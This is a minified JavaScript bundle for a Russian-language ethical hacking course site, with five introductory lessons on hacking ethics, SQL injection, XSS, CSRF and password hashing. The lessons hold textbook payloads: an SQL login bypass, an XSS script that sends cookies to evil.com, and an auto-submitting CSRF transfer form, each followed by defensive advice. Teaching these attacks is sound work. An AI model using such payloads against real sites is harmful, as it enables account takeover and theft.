(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,42141,e=>{"use strict";var s=e.i(43476);e.s(["LessonContent",0,({content:e})=>{let t=e.split("\n"),i=[],a=!1,r=[],n=!1,l=[],c=()=>{n&&l.length>0&&(i.push((0,s.jsx)("ul",{className:"list-disc list-inside space-y-2 my-4 text-gray-700",children:l},`list-${i.length}`)),l=[],n=!1)},d=e=>e.includes("**")?e.split(/\*\*(.+?)\*\*/).map((e,t)=>t%2==1?(0,s.jsx)("strong",{className:"text-gray-900",children:e},t):e):e;return t.forEach((e,t)=>{if(e.startsWith("```"))return void(a?(i.push((0,s.jsx)("pre",{className:"bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto my-4 font-mono text-sm",children:(0,s.jsx)("code",{children:r.join("\n")})},`code-${t}`)),r=[],a=!1):(c(),a=!0));if(a)return void r.push(e);if(e.startsWith("# ")){c(),i.push((0,s.jsx)("h1",{className:"text-3xl font-bold text-gray-800 mt-8 mb-4",children:e.replace("# ","")},`h1-${t}`));return}if(e.startsWith("## ")){c(),i.push((0,s.jsx)("h2",{className:"text-2xl font-bold text-gray-800 mt-6 mb-3",children:e.replace("## ","")},`h2-${t}`));return}if(e.startsWith("### ")){c(),i.push((0,s.jsx)("h3",{className:"text-xl font-bold text-gray-800 mt-4 mb-2",children:e.replace("### ","")},`h3-${t}`));return}if(""===e.trim())return void c();if(e.startsWith("- ")){n=!0;let i=e.substring(2),a=i.match(/^([✅❌⚠️🔴🟢🟡])\s*\*\*(.+?)\*\*\s*(.*)?$/);if(a){let[,e,i,r]=a;l.push((0,s.jsxs)("li",{className:"ml-2",children:[(0,s.jsx)("span",{className:"mr-2",children:e}),(0,s.jsx)("strong",{className:"text-gray-900",children:i}),r&&(0,s.jsxs)("span",{className:"text-gray-700",children:[" ",r]})]},`item-${t}`));return}if(/^[✅❌⚠️🔴🟢🟡]/.test(i)){let e=i.charAt(0),a=i.substring(1).trim();l.push((0,s.jsxs)("li",{className:"ml-2",children:[(0,s.jsx)("span",{className:"mr-2",children:e}),(0,s.jsx)("span",{children:d(a)})]},`item-${t}`));return}let r=i.match(/^\*\*(.+?)\*\*\s*[—-]\s*(.+)$/);if(r){let[,e,i]=r;l.push((0,s.jsxs)("li",{className:"ml-2",children:[(0,s.jsx)("strong",{className:"text-gray-900",children:e}),(0,s.jsxs)("span",{className:"text-gray-700",children:[" — ",i]})]},`item-${t}`));return}return i.startsWith("**")?void l.push((0,s.jsx)("li",{className:"ml-2",children:d(i)},`item-${t}`)):void l.push((0,s.jsx)("li",{className:"ml-2",children:d(i)},`item-${t}`))}c(),i.push((0,s.jsx)("p",{className:"text-gray-700 my-2 leading-relaxed",children:d(e)},`p-${t}`))}),c(),(0,s.jsx)("div",{className:"prose prose-lg max-w-none",children:i})}])},18566,(e,s,t)=>{s.exports=e.r(76562)},40115,e=>{"use strict";let s=[{id:1,title:"Введение в этичный хакинг",description:"Что такое этичный хакинг и почему это важно",category:"hacking",difficulty:"beginner",duration:15,content:`
# Введение в этичный хакинг

Этичный хакинг — это практика взлома компьютерных систем с целью обнаружения уязвимостей до того, как их найдут злоумышленники.

## Основные принципы:
- **Разрешение** — всегда получайте письменное разрешение перед тестированием
- **Законность** — действуйте в рамках закона
- **Конфиденциальность** — не разглашайте найденные уязвимости
- **Ответственность** — сообщайте о найденных проблемах владельцам

## Типы хакеров:
- 🟢 **White Hat** — этичные хакеры, защищающие системы
- 🔴 **Black Hat** — злоумышленники
- 🟡 **Gray Hat** — действуют без разрешения, но без злого умысла
    `,isCompleted:!1},{id:2,title:"SQL-инъекции",description:"Научитесь находить и предотвращать SQL-уязвимости",category:"hacking",difficulty:"beginner",duration:30,content:`
# SQL-инъекции

SQL-инъекция — это атака, при которой злоумышленник может выполнить произвольный SQL-код в базе данных.

## Как это работает:

1. Злоумышленник вводит специальный код в поле ввода
2. Этот код объединяется с SQL-запросом
3. База данных выполняет изменённый запрос

## Пример уязвимости:

\`\`\`sql
-- Уязвимый код
SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
\`\`\`

## Пример атаки:

Если в поле username ввести: \`admin' --\`

Запрос станет:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
\`\`\`

Часть после -- игнорируется, и злоумышленник входит как admin!

## Защита:
- Используйте параметризованные запросы
- Валидируйте все входные данные
- Применяйте принцип минимальных привилегий
    `,isCompleted:!1},{id:3,title:"XSS-атаки",description:"Cross-Site Scripting — как защитить сайт от внедрения скриптов",category:"hacking",difficulty:"intermediate",duration:25,content:`
# XSS-атаки (Cross-Site Scripting)

XSS — это уязвимость, позволяющая злоумышленнику внедрить вредоносный JavaScript-код на страницу.

## Типы XSS:

### 1. Reflected XSS
Вредоносный скрипт приходит в запросе и сразу выполняется

### 2. Stored XSS
Скрипт сохраняется на сервере (в комментариях, сообщениях)

### 3. DOM-based XSS
Уязвимость в клиентском JavaScript-коде

## Пример атаки:

Злоумышленник оставляет комментарий:
\`\`\`html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

## Защита:
- Экранируйте все выходные данные
- Используйте Content Security Policy (CSP)
- Валидируйте входные данные
- Используйте современные фреймворки (React, Vue)
    `,isCompleted:!1},{id:4,title:"CSRF-атаки",description:"Cross-Site Request Forgery — подделка запросов",category:"hacking",difficulty:"intermediate",duration:20,content:`
# CSRF-атаки (Cross-Site Request Forgery)

CSRF — это атака, при которой злоумышленник заставляет пользователя выполнить нежелательное действие на сайте, где он аутентифицирован.

## Как это работает:

1. Пользователь авторизован на сайте банка
2. Злоумышленник создаёт форму на своём сайте
3. Пользователь посещает сайт злоумышленника
4. Форма автоматически отправляет запрос в банк

## Пример:

\`\`\`html
<!-- Форма злоумышленника -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="evil-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

## Защита:
- Используйте CSRF-токены
- Проверяйте заголовок Origin/Referer
- Требуйте повторной аутентификации для важных операций
- Используйте SameSite cookie
    `,isCompleted:!1},{id:5,title:"Безопасность паролей",description:"Хеширование, соль и лучшие практики",category:"hacking",difficulty:"beginner",duration:20,content:`
# Безопасность паролей

## Почему пароли важны?

Пароли — первая линия защиты аккаунта.

## Плохие практики:
- ❌ Пароль: 123456
- ❌ Пароль: password
- ❌ Один пароль для всех сайтов
- ❌ Хранение паролей в открытом виде

## Хорошие практики:
- ✅ Минимум 12 символов
- ✅ Комбинация букв, цифр, символов
- ✅ Уникальный пароль для каждого сайта
- ✅ Использование менеджера паролей
- ✅ Двухфакторная аутентификация

## Хеширование:

Пароли должны храниться в захешированном виде:

\`\`\`
password → bcrypt → $2b$10$N9qo8uLOickgx2ZMRZoMye...
\`\`\`

## Алгоритмы:
- ✅ bcrypt (рекомендуется)
- ✅ Argon2 (современный)
- ✅ scrypt
- ❌ MD5 (устарел)
- ❌ SHA1 (устарел)
    `,isCompleted:!1}],t=async()=>s,i=async e=>s.find(s=>s.id===e)||null;e.s(["getLessonById",0,i,"getLessons",0,t])},72438,e=>{"use strict";var s=e.i(43476),t=e.i(71645),i=e.i(18566),a=e.i(22016),r=e.i(46932),n=e.i(40115),l=e.i(42141);let c=()=>{let e=(0,i.useSearchParams)(),c=(0,i.useRouter)(),[d,o]=(0,t.useState)(null),[m,h]=(0,t.useState)([]),[x,u]=(0,t.useState)(!0),[g,p]=(0,t.useState)(!1);if((0,t.useEffect)(()=>{(async()=>{try{let s=parseInt(e.get("id")||"0");if(isNaN(s)||0===s)return void c.push("/hacking");let[t,i]=await Promise.all([(0,n.getLessonById)(s),(0,n.getLessons)()]);if(!t)return void c.push("/hacking");o(t),h(i.filter(e=>e.id!==s).slice(0,3))}catch(e){console.error("Ошибка при загрузке урока:",e),c.push("/hacking")}finally{u(!1)}})()},[e,c]),x)return(0,s.jsx)("div",{className:"min-h-screen bg-gradient-to-b from-blue-50 to-white",children:(0,s.jsx)("div",{className:"container mx-auto px-4 py-12",children:(0,s.jsxs)("div",{className:"max-w-4xl mx-auto",children:[(0,s.jsxs)("div",{className:"animate-pulse space-y-4 mb-8",children:[(0,s.jsx)("div",{className:"h-8 bg-gray-200 rounded w-3/4"}),(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded w-1/2"})]}),(0,s.jsxs)("div",{className:"animate-pulse space-y-3",children:[(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded"}),(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded"}),(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded w-5/6"}),(0,s.jsx)("div",{className:"h-32 bg-gray-200 rounded my-6"}),(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded"}),(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded"})]})]})})});if(!d)return null;let j=e=>{switch(e){case"beginner":return"bg-green-100 text-green-800";case"intermediate":return"bg-yellow-100 text-yellow-800";case"advanced":return"bg-red-100 text-red-800";default:return"bg-gray-100 text-gray-800"}},y=e=>{switch(e){case"beginner":return"Начинающий";case"intermediate":return"Средний";case"advanced":return"Продвинутый";default:return e}};return(0,s.jsx)("div",{className:"min-h-screen bg-gradient-to-b from-blue-50 to-white",children:(0,s.jsxs)("div",{className:"container mx-auto px-4 py-12",children:[(0,s.jsx)("nav",{className:"mb-6",children:(0,s.jsxs)("ol",{className:"flex items-center space-x-2 text-sm text-gray-600",children:[(0,s.jsx)("li",{children:(0,s.jsx)(a.default,{href:"/",className:"hover:text-blue-600",children:"Главная"})}),(0,s.jsx)("li",{className:"text-gray-400",children:"/"}),(0,s.jsx)("li",{children:(0,s.jsx)(a.default,{href:"/hacking",className:"hover:text-blue-600",children:"Уязвимости сайтов"})}),(0,s.jsx)("li",{className:"text-gray-400",children:"/"}),(0,s.jsx)("li",{className:"text-gray-900 font-medium",children:d.title})]})}),(0,s.jsxs)(r.motion.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},className:"max-w-4xl mx-auto",children:[(0,s.jsxs)("div",{className:"bg-white rounded-lg shadow-md p-6 mb-6",children:[(0,s.jsxs)("div",{className:"flex items-start justify-between mb-4",children:[(0,s.jsx)("h1",{className:"text-3xl md:text-4xl font-bold text-gray-800",children:d.title}),(0,s.jsx)("span",{className:`px-3 py-1 rounded-full text-sm font-medium whitespace-nowrap ml-4 ${j(d.difficulty)}`,children:y(d.difficulty)})]}),(0,s.jsx)("p",{className:"text-gray-600 text-lg mb-4",children:d.description}),(0,s.jsxs)("div",{className:"flex items-center space-x-6 text-sm text-gray-500",children:[(0,s.jsxs)("span",{className:"flex items-center",children:[(0,s.jsx)("svg",{className:"w-5 h-5 mr-2",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:(0,s.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"})}),d.duration," минут"]}),(0,s.jsxs)("span",{className:"flex items-center",children:[(0,s.jsx)("svg",{className:"w-5 h-5 mr-2",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:(0,s.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4M7.835 4.697a3.42 3.42 0 001.946-.806 3.42 3.42 0 014.438 0 3.42 3.42 0 001.946.806 3.42 3.42 0 013.138 3.138 3.42 3.42 0 00.806 1.946 3.42 3.42 0 010 4.438 3.42 3.42 0 00-.806 1.946 3.42 3.42 0 01-3.138 3.138 3.42 3.42 0 00-1.946.806 3.42 3.42 0 01-4.438 0 3.42 3.42 0 00-1.946-.806 3.42 3.42 0 01-3.138-3.138 3.42 3.42 0 00-.806-1.946 3.42 3.42 0 010-4.438 3.42 3.42 0 00.806-1.946 3.42 3.42 0 013.138-3.138z"})}),"hacking"===d.category?"Хакинг":"AI"]})]}),g&&(0,s.jsxs)("div",{className:"mt-4 flex items-center text-green-600",children:[(0,s.jsx)("svg",{className:"w-6 h-6 mr-2",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:(0,s.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"})}),(0,s.jsx)("span",{className:"font-semibold",children:"Вы завершили этот урок!"})]})]}),(0,s.jsx)("div",{className:"bg-white rounded-lg shadow-md p-8 mb-6",children:(0,s.jsx)(l.LessonContent,{content:d.content})}),!g&&(0,s.jsxs)(r.motion.div,{initial:{opacity:0},animate:{opacity:1},className:"bg-white rounded-lg shadow-md p-6 mb-6 text-center",children:[(0,s.jsx)("p",{className:"text-gray-700 mb-4",children:"Вы изучили материал? Отметьте урок как завершённый!"}),(0,s.jsx)("button",{onClick:()=>{p(!0),localStorage.setItem(`lesson-${e.get("id")}-completed`,"true")},className:"bg-green-600 hover:bg-green-700 text-white font-semibold py-3 px-8 rounded-lg transition-colors",children:"✅ Завершить урок"})]}),(0,s.jsx)("div",{className:"flex justify-between items-center mb-8",children:(0,s.jsxs)(a.default,{href:"/hacking",className:"text-blue-600 hover:text-blue-700 font-semibold flex items-center",children:[(0,s.jsx)("svg",{className:"w-5 h-5 mr-2",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:(0,s.jsx)("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M10 19l-7-7m0 0l7-7m-7 7h18"})}),"Назад к урокам"]})}),m.length>0&&(0,s.jsxs)("div",{children:[(0,s.jsx)("h2",{className:"text-2xl font-bold text-gray-800 mb-6",children:"Другие уроки"}),(0,s.jsx)("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6",children:m.map(e=>(0,s.jsxs)(a.default,{href:`/hacking-lesson?id=${e.id}`,className:"bg-white rounded-lg shadow-md p-6 hover:shadow-lg transition-shadow",children:[(0,s.jsx)("h3",{className:"text-lg font-bold text-gray-800 mb-2",children:e.title}),(0,s.jsx)("p",{className:"text-gray-600 text-sm mb-4 line-clamp-2",children:e.description}),(0,s.jsx)("span",{className:`px-3 py-1 rounded-full text-xs font-medium ${j(e.difficulty)}`,children:y(e.difficulty)})]},e.id))})]})]})]})})};e.s(["default",0,()=>(0,s.jsx)(t.Suspense,{fallback:(0,s.jsx)("div",{className:"min-h-screen bg-gradient-to-b from-blue-50 to-white",children:(0,s.jsx)("div",{className:"container mx-auto px-4 py-12",children:(0,s.jsx)("div",{className:"max-w-4xl mx-auto",children:(0,s.jsxs)("div",{className:"animate-pulse space-y-4",children:[(0,s.jsx)("div",{className:"h-8 bg-gray-200 rounded w-3/4"}),(0,s.jsx)("div",{className:"h-4 bg-gray-200 rounded w-1/2"})]})})})}),children:(0,s.jsx)(c,{})})])}]);